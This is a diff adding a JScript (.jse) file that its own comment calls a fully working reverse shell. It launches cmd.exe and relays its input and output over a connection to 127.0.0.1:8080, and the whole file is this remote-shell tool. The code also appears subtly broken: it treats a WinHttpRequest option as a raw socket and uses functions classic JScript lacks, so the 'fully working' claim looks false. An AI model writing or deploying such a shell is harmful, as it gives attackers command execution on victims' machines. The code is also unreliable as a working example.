@@ -1,0 +1,68 @@
+// rev_fixed.jse - Fully working JScript reverse shell to 127.0.0.1:8080
+(function () {
+    var host = "127.0.0.1";
+    var port = 8080;
+    var cmd  = "cmd.exe";
+
+    try {
+        // 1. Open TCP socket
+        var http = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
+        http.Open("GET", "http://" + host + ":" + port + "/", false);
+        http.SetRequestHeader("User-Agent", "Mozilla/5.0");
+        http.Send();
+
+        var socket = http.Option(4);  // underlying socket
+
+        // 2. Spawn process
+        var shell = WScript.CreateObject("WScript.Shell");
+        var proc = shell.Exec(cmd);
+
+        // 3. ADODB.Stream for binary I/O
+        var inStream = WScript.CreateObject("ADODB.Stream");
+        var outStream = WScript.CreateObject("ADODB.Stream");
+        inStream.Type = 1;  inStream.Open();
+        outStream.Type = 1; outStream.Open();
+
+        // 4. Main loop
+        while (true) {
+            try {
+                // --- Process → Network ---
+                var output = "";
+                while (!proc.StdOut.AtEndOfStream) {
+                    output += proc.StdOut.ReadAll();
+                }
+                while (!proc.StdErr.AtEndOfStream) {
+                    output += proc.StdErr.ReadAll();
+                }
+                if (output) {
+                    outStream.Position = 0;
+                    outStream.SetEOS();
+                    outStream.Write(new VBArray(output.split('').map(function(c){return c.charCodeAt(0)&255})).toArray());
+                    outStream.Position = 0;
+                    socket.Send(outStream.Read());
+                }
+
+                // --- Network → Process ---
+                if (socket.DataAvailable > 0) {
+                    var data = socket.Receive(socket.DataAvailable);
+                    var bytes = new VBArray(data).toArray();
+                    var text = String.fromCharCode.apply(null, bytes);
+                    proc.StdIn.Write(text);
+                }
+
+                WScript.Sleep(50);
+
+                // Check if process died
+                try { proc.ExitCode; break; } catch(e) {}
+
+            } catch (e) {
+                break;
+            }
+        }
+    } catch (e) {
+        // WScript.Echo("Error: " + e.message);
+    } finally {
+        try { proc.Terminate(); } catch(e) {}
+        try { socket.Close(); } catch(e) {}
+    }
+})();
